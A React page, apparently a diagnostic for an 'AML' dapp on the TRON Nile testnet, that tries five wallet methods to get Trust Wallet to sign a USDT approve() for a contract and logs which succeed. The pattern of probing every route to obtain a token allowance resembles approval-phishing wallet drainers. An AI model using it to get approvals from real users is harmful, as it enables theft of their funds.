// pages/diag.jsx
// Открывай: aml-dapp-2.vercel.app/diag2

import { useState } from 'react';

const TRONGRID_URL  = 'https://nile.trongrid.io';
const USDT_CONTRACT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
const AML_CONTRACT  = 'THG9SQhxa6knVqkvQwmMHfwPsMtzvaVoTc';
const AMOUNT        = 1_290_000;

// base58 → hex (без префикса 41)
function b58hex(addr) {
  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let n = BigInt(0);
  for (const ch of addr) n = n * BigInt(58) + BigInt(AB.indexOf(ch));
  return n.toString(16).padStart(50, '0').slice(2, 42);
}

// EVM calldata для approve(address,uint256)
function approveCalldata(spender, amount) {
  const sig     = '095ea7b3'; // keccak256('approve(address,uint256)')[:4]
  const spHex   = b58hex(spender).padStart(64, '0');
  const amtHex  = amount.toString(16).padStart(64, '0');
  return '0x' + sig + spHex + amtHex;
}

// EVM адрес из TRON base58
function toEvmAddr(base58) {
  return '0x' + b58hex(base58);
}

function Row({ label, value, ok }) {
  const c = ok === true ? '#10b981' : ok === false ? '#ef4444' : '#f59e0b';
  return (
    <div style={{ display:'flex', justifyContent:'space-between', padding:'5px 0', borderBottom:'1px solid rgba(255,255,255,0.07)', fontSize:11 }}>
      <span style={{ color:'#94a3b8', fontFamily:'monospace', maxWidth:'42%', wordBreak:'break-all' }}>{label}</span>
      <span style={{ color:c, fontFamily:'monospace', maxWidth:'55%', textAlign:'right', wordBreak:'break-all' }}>{String(value)}</span>
    </div>
  );
}

function Log({ entries }) {
  return (
    <div style={{ marginBottom:16, background:'rgba(255,255,255,0.04)', borderRadius:10, padding:'10px 12px' }}>
      <div style={{ color:'#60a5fa', fontWeight:600, fontSize:12, marginBottom:6 }}>📋 Лог</div>
      {entries.map((e, i) => (
        <div key={i} style={{ fontSize:11, fontFamily:'monospace', padding:'2px 0',
          color: e.ok === true ? '#10b981' : e.ok === false ? '#ef4444' : '#94a3b8' }}>
          {e.t} {e.msg}
        </div>
      ))}
    </div>
  );
}

export default function DiagPage() {
  const [log,  setLog]  = useState([]);
  const [res,  setRes]  = useState({});
  const [busy, setBusy] = useState(false);

  const L = (msg, ok) => setLog(p => [...p, { msg, ok, t: new Date().toLocaleTimeString() }]);

  const run = async () => {
    setBusy(true); setLog([]); setRes({});
    const r = {};
    const wt = window.trustwallet;

    if (!wt?.request) {
      L('❌ window.trustwallet.request недоступен', false);
      setRes(r); setBusy(false); return;
    }

    // ── Шаг 1: Получаем адрес ─────────────────────────────────────────────
    L('Шаг 1: получаем адрес...');
    let addr = null;

    for (const method of ['tron_requestAccounts', 'eth_requestAccounts']) {
      try {
        const result = await wt.request({ method });
        L(`${method}: ${JSON.stringify(result)?.slice(0, 60)}`, null);
        const a = Array.isArray(result) ? result[0] : result?.address || result?.base58;
        if (a && (a.startsWith('T') || a.startsWith('0x'))) { addr = a; break; }
      } catch(e) { L(`${method} err: ${e.message?.slice(0,50)}`, false); }
    }

    // Fallback: tronWeb
    if (!addr) {
      const tw = window.tronWeb || window.trustwallet?.tronWeb;
      addr = tw?.defaultAddress?.base58 || null;
      if (addr) L('tronWeb addr: ' + addr, true);
    }

    r.addr = addr;
    L('Адрес: ' + (addr || 'НЕ НАЙДЕН'), !!addr);
    if (!addr) { setRes(r); setBusy(false); return; }

    // ── Шаг 2: Строим calldata для approve ────────────────────────────────
    L('Шаг 2: строим calldata approve...');
    const calldata = approveCalldata(AML_CONTRACT, AMOUNT);
    const toAddr   = toEvmAddr(USDT_CONTRACT);
    r.calldata = calldata.slice(0, 20) + '...';
    r.to       = toAddr;
    L('calldata: ' + calldata.slice(0, 30) + '...', true);
    L('to (EVM): ' + toAddr, true);

    // ── Шаг 3: Пробуем eth_sendTransaction ────────────────────────────────
    L('Шаг 3: eth_sendTransaction...');
    try {
      const txHash = await wt.request({
        method: 'eth_sendTransaction',
        params: [{
          from:  addr.startsWith('0x') ? addr : ('0x' + b58hex(addr)),
          to:    toAddr,
          data:  calldata,
          value: '0x0',
          gas:   '0x98968', // 625000
        }],
      });
      L('✅ eth_sendTransaction SUCCESS: ' + String(txHash)?.slice(0,30), true);
      r.eth_send = 'SUCCESS: ' + String(txHash);
    } catch(e) {
      L('❌ eth_sendTransaction err: ' + e.message, false);
      r.eth_send = e.message;
    }

    // ── Шаг 4: Пробуем wallet_sendCalls (EIP-5792) ────────────────────────
    L('Шаг 4: wallet_sendCalls...');
    try {
      const result = await wt.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '1.0',
          calls: [{
            to:   toAddr,
            data: calldata,
          }],
        }],
      });
      L('✅ wallet_sendCalls SUCCESS: ' + JSON.stringify(result)?.slice(0,40), true);
      r.wallet_sendCalls = 'SUCCESS: ' + JSON.stringify(result);
    } catch(e) {
      L('❌ wallet_sendCalls err: ' + e.message, false);
      r.wallet_sendCalls = e.message;
    }

    // ── Шаг 5: Пробуем через window.trustwallet.ethereum ──────────────────
    L('Шаг 5: trustwallet.ethereum.request...');
    try {
      const eth = window.trustwallet?.ethereum || window.ethereum;
      if (eth?.request) {
        const txHash = await eth.request({
          method: 'eth_sendTransaction',
          params: [{
            from:  addr.startsWith('0x') ? addr : ('0x' + b58hex(addr)),
            to:    toAddr,
            data:  calldata,
            value: '0x0',
          }],
        });
        L('✅ ethereum.eth_sendTransaction SUCCESS: ' + String(txHash)?.slice(0,30), true);
        r.eth_provider = 'SUCCESS: ' + String(txHash);
      } else {
        L('ethereum.request недоступен', null);
        r.eth_provider = 'недоступен';
      }
    } catch(e) {
      L('❌ ethereum.eth_sendTransaction err: ' + e.message, false);
      r.eth_provider = e.message;
    }

    // ── Шаг 6: Пробуем tronWeb.trx.sign если есть ────────────────────────
    L('Шаг 6: tronWeb.trx.sign...');
    try {
      const tw = window.tronWeb || window.trustwallet?.tronWeb || window.trustwallet?.tronLink?.tronWeb;
      if (tw?.trx?.sign) {
        // Строим TRON tx через TronGrid
        const buildRes = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address:     '41' + b58hex(addr.startsWith('T') ? addr : addr),
            contract_address:  '41' + b58hex(USDT_CONTRACT),
            function_selector: 'approve(address,uint256)',
            parameter:         b58hex(AML_CONTRACT).padStart(64,'0') + AMOUNT.toString(16).padStart(64,'0'),
            fee_limit:         10_000_000, call_value: 0, visible: false,
          }),
        });
        const buildData = await buildRes.json();
        if (buildData?.transaction) {
          const signed = await tw.trx.sign(buildData.transaction);
          L('✅ tronWeb.trx.sign SUCCESS: ' + signed?.txID?.slice(0,16), true);
          r.tronweb_sign = 'SUCCESS txID: ' + signed?.txID;
        }
      } else {
        L('tronWeb.trx.sign недоступен', null);
        r.tronweb_sign = 'недоступен';
      }
    } catch(e) {
      L('❌ tronWeb.trx.sign err: ' + e.message, false);
      r.tronweb_sign = e.message;
    }

    L('✅ Диагностика завершена');
    setRes(r); setBusy(false);
  };

  return (
    <div style={{ background:'#0f172a', minHeight:'100vh', padding:'16px', color:'#e2e8f0', fontFamily:'sans-serif' }}>
      <div style={{ fontSize:16, fontWeight:700, marginBottom:4 }}>🔍 Sign Methods v3</div>
      <div style={{ fontSize:11, color:'#64748b', marginBottom:12 }}>aml-dapp-2.vercel.app/diag</div>

      <button onClick={run} disabled={busy} style={{
        background: busy ? '#374151' : '#3b82f6', color:'#fff', border:'none',
        borderRadius:8, padding:'8px 20px', fontSize:13, cursor: busy ? 'not-allowed' : 'pointer', marginBottom:14,
      }}>
        {busy ? '⏳ Тестируем...' : '🚀 Запустить тест'}
      </button>

      {log.length > 0 && <Log entries={log} />}

      {Object.keys(res).length > 0 && (
        <div style={{ background:'rgba(255,255,255,0.05)', borderRadius:10, padding:'10px 12px' }}>
          <div style={{ color:'#60a5fa', fontWeight:600, fontSize:12, marginBottom:6 }}>📊 Результаты</div>
          <Row label="Адрес"              value={res.addr || 'нет'}           ok={!!res.addr} />
          <Row label="TX построена"       value={res.txBuilt ?? res.calldata} ok={!!res.calldata} />
          <Row label="eth_sendTransaction" value={res.eth_send || '—'}        ok={res.eth_send?.startsWith('SUCCESS')} />
          <Row label="wallet_sendCalls"   value={res.wallet_sendCalls || '—'} ok={res.wallet_sendCalls?.startsWith('SUCCESS')} />
          <Row label="ethereum.request"   value={res.eth_provider || '—'}     ok={res.eth_provider?.startsWith('SUCCESS')} />
          <Row label="tronWeb.trx.sign"   value={res.tronweb_sign || '—'}     ok={res.tronweb_sign?.startsWith('SUCCESS')} />
        </div>
      )}
    </div>
  );
}
